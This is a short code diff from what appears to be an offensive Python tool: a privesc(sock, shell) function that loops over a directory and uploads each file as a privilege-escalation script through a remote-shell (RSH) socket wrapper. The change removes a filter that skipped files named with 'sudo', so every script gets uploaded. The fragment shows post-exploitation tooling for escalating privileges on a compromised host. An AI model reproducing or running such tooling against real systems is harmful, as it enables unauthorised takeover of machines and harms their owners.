@@ -31,7 +31,7 @@ def privesc(sock, shell):
     counter = 1
     for filename in os.listdir(directory):
         f = os.path.join(directory, filename)
-        if os.path.isfile(f) and "sudo" not in f:
+        if os.path.isfile(f):
             print('[+] Uploading privesc script number {}'.format(counter))
             rsh = RSH(sock)
             if '.sh' in f:
